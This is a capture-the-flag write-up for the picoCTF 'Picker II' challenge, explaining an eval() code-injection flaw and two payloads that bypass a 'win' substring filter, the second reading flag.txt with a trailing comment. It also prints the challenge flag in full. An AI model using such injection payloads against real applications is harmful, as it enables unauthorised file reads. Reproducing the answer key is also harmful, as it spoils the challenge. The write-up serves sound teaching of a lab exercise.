# Picker II

**Category:** Reverse Engineering
**Difficulty:** Medium
**Author:** LT 'syreal' Jones

## Challenge Description

The challenge provides a Python program and asks us to find a way to retrieve the flag from the remote server.

We can connect to the challenge using Netcat:

```bash
nc saturn.picoctf.net <port>
```

## Source Code Analysis

I first downloaded the source code and looked through it. After a quick review, the most important part of the program was this section:

```python
while(True):
    try:
        user_input = input('==> ')
        if(filter(user_input)):
            eval(user_input + '()')
        else:
            print('Illegal input')
    except Exception as e:
        print(e)
        break
```

The important line is:

```python
eval(user_input + '()')
```

Whatever we enter is placed inside `eval()`, with `()` automatically appended to the end.

For example, entering:

```text
getRandomNumber
```

causes the program to evaluate:

```python
getRandomNumber()
```

Looking through the source code, the function we want to execute is clearly `win()`:

```python
def win():
    flag = open('flag.txt', 'r').read()
    flag = flag.strip()
    str_flag = ''
    for c in flag:
        str_flag += str(hex(ord(c))) + ' '
    print(str_flag)
```

This function reads `flag.txt`, converts every character of the flag into hexadecimal, and prints the result.

However, unlike Picker I, this challenge adds another protection:

```python
def filter(user_input):
    if 'win' in user_input:
        return False
    return True
```

This means any input containing the substring `win` is rejected.

Therefore, simply entering:

```text
win
```

does not work.

```text
==> win
Illegal input
```

The goal is therefore to either call `win()` without directly writing its name or find another way to read `flag.txt`.

## Method 1: Python Runtime Introspection

My first idea was to manually open `flag.txt` and print it. However, I initially focused on finding a way to invoke the existing `win()` function without using its name.

Since the input is passed to `eval()`, the payload has to be a valid Python expression. Unlike `exec()`, `eval()` cannot directly execute multiple Python statements separated like a normal script.

While researching ways to access functions without explicitly referring to their names, I came across Python runtime introspection.

Python's `globals()` function returns the current global namespace as a dictionary. We can inspect its values and select objects that are callable.

I used:

```python
[v for v in globals().values() if callable(v) and getattr(v, "__module__", None) == __name__][3]
```

The list comprehension:

```python
[v for v in globals().values()
 if callable(v) and getattr(v, "__module__", None) == __name__]
```

collects callable objects defined in the current module.

In this program, the relevant functions were inserted into the global namespace in the same order they were defined. With the current source code, index `[3]` refers to `win`.

This is somewhat dependent on the exact contents and ordering of the program's global namespace, so it is not the most robust exploit, but it works for this challenge.

There is also an important detail in the vulnerable code:

```python
eval(user_input + '()')
```

Because `()` is appended automatically, our input:

```python
[v for v in globals().values() if callable(v) and getattr(v, "__module__", None) == __name__][3]
```

actually becomes:

```python
[v for v in globals().values() if callable(v) and getattr(v, "__module__", None) == __name__][3]()
```

Therefore, the function stored at index `3` is immediately called.

Running the payload produced:

```text
==> [v for v in globals().values() if callable(v) and getattr(v, "__module__", None) == __name__][3]
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x62 0x39 0x32 0x34 0x65 0x38 0x65 0x35 0x7d
```

This is exactly what the `win()` function is supposed to print: the flag encoded as hexadecimal character values.

I then converted the hexadecimal values back to ASCII using CyberChef:

```text
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}
```

## Method 2: Reading `flag.txt` Directly

After solving the challenge using runtime introspection, I looked at the vulnerable `eval()` call again and realized there was a much simpler solution.

Instead of calling `win()`, we can directly read the flag:

```python
print(open('flag.txt', 'r').read())
```

The problem is that the program automatically appends `()` to our input.

Without doing anything else, it would become:

```python
print(open('flag.txt', 'r').read())()
```

The `print()` call returns `None`, so Python would then attempt to call `None` as a function, causing an error.

However, Python comments give us an easy way around this.

If we submit:

```text
print(open('flag.txt', 'r').read())#
```

the program constructs:

```python
print(open('flag.txt', 'r').read())#()
```

Everything after `#` is treated as a comment, including the automatically appended `()`.

As a result, the expression that is effectively evaluated is simply:

```python
print(open('flag.txt', 'r').read())
```

Running it gives the flag directly:

```text
==> print(open('flag.txt', 'r').read())#
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}
```

## Conclusion

The main vulnerability is the use of:

```python
eval(user_input + '()')
```

on attacker-controlled input.

The filter:

```python
if 'win' in user_input:
```

only prevents us from typing the literal substring `win`. It does not restrict what other Python expressions can be evaluated.

I found two ways to solve the challenge:

```python
[v for v in globals().values() if callable(v) and getattr(v, "__module__", None) == __name__][3]
```

which indirectly accesses and executes `win()`, and the simpler:

```python
print(open('flag.txt', 'r').read())#
```

which reads the flag file directly and uses `#` to comment out the `()` appended by the program.

The second method is simpler and more reliable because it does not depend on the ordering of objects in the global namespace.

## Flag

```text
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}
```
